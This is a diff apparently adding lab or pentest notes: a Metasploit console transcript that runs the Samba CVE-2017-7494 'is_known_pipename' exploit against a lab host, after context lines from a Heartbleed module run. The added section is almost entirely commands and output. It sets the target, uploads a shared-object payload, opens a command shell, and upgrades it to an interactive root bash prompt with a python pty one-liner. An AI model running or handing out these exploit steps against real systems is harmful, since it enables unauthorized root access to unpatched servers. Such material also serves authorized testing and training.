@@ -78,4 +78,42 @@ msf auxiliary(openssl_heartbleed) > run
 [*] Auxiliary module execution completed
 msf auxiliary(openssl_heartbleed) > 
 
+Samba CVE-2017-7494
 
+msf exploit(is_known_pipename) > use exploit/linux/samba/is_known_pipename 
+msf exploit(is_known_pipename) > show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOST                            yes       The target address
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Interact)
+
+
+msf exploit(is_known_pipename) > set RHOST 10.1.1.4
+RHOST => 10.1.1.4
+msf exploit(is_known_pipename) > exploit 
+
+[*] 10.1.1.4:445 - Using location \\10.1.1.4\share\ for the path
+[*] 10.1.1.4:445 - Retrieving the remote path of the share 'share'
+[*] 10.1.1.4:445 - Share 'share' has server-side path '/tmp/
+[*] 10.1.1.4:445 - Uploaded payload to \\10.1.1.4\share\upLdCyBq.so
+[*] 10.1.1.4:445 - Loading the payload from server-side path /tmp/upLdCyBq.so using \\PIPE\/tmp/upLdCyBq.so...
+[-] 10.1.1.4:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 10.1.1.4:445 - Loading the payload from server-side path /tmp/upLdCyBq.so using /tmp/upLdCyBq.so...
+[+] 10.1.1.4:445 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+[*] Command shell session 1 opened (10.100.100.5:45983 -> 10.1.1.4:445) at 2017-10-25 22:47:34 +0700
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@1d71e2ebf7b6:/tmp# exit
